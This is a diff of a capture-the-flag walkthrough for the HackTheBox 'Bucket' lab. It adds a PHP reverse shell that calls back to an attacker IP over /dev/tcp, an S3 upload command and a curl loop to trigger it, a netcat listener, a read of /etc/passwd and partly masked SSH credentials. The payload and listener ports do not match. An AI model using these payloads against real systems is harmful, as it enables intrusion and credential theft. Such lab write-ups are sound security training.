@@ -45,12 +45,13 @@ docker run --rm -it -v ~/.aws:/root/.aws amazon/aws-cli --endpoint-url http://s3
 After a quick check, list of available commands that we can use in aws cli in `s3.bucket.htb` include cp/move/delete
 => That's mean we can get our reverse shell by uploading rev shell file to s3 server.
 
+# Exploitation
+
 Reverse shell payload:
 ```
-
 <?php
 echo 'running shell';
-$ip='10.10.14.96';   #Change this
+$ip='10.10.14.71';   #Change this
 $port='8787';
 $reverse_shells = array(
     '/bin/bash -i > /dev/tcp/'.$ip.'/'.$port.' 0<&1 2>&1',
@@ -69,7 +70,50 @@ foreach ($reverse_shells as $reverse_shell) {
 system('id');
 ?>
 ```
+
 Uploading reverse shell:
 ```
-docker run --rm -it -v ~/.aws:/root/.aws amazon/aws-cli --endpoint-url http://s3.bucket.htb/ s3 cp myrev.php s3://adserver/myrev.php
+docker run --rm -it -v ~/.aws:/root/.aws amazon/aws-cli --endpoint-url http://s3.bucket.htb/ s3 cp myrev.php s3://adserver/php-revshell.php
 ```
+
+***Note***: After a few tries, I realize after 30 seconds ~ 1 minute, the machine clean itself. Which mean is that everything we do will be deleted/removed, so we have to be fast !!!
+
+I tried to access `bucket.htb/myrev.php` but every browser that I have tried with (Chrome/Safari/Firefox), they all offer me to download the file instead of executing it. So I wrote a quick script to increase the chance of getting reverse shell
+
+```
+#/bin/bash
+
+docker run --rm -it -v ~/.aws:/root/.aws amazon/aws-cli --endpoint-url http://s3.bucket.htb s3 cp /root/.aws/php-revshell.php s3://adserver/
+
+echo ""
+echo "[+] Executing reverse shell on s3 server"
+while [ 0 ]; do
+	curl http://bucket.htb/php-revshell.php &> /dev/null
+done
+```
+It simply automate the process of copying file to s3 server and trying to `curl` the URL
+
+In our machine, start Netcat listener
+```
+nc -lvnp 4444 //Change port
+```
+
+After getting a reverse shell to our machine, we will want to spawn a TTY shell for a more interactive shell
+```
+/usr/bin/script -qc /bin/bash /dev/null
+```
+
+Get users in the system
+```
+cat /etc/passwd
+```
+We see that there is a user in the machine: `roy`
+With the `username` and `password` we have collected from querying DynamoDB, it's worth to try some of the password with user `roy`
+`roy` SSH creds:
+
+```
+roy:n2v*******:.Aa2
+```
+=> Get the user.txt flag in the machine
+
+# Post Exploitation
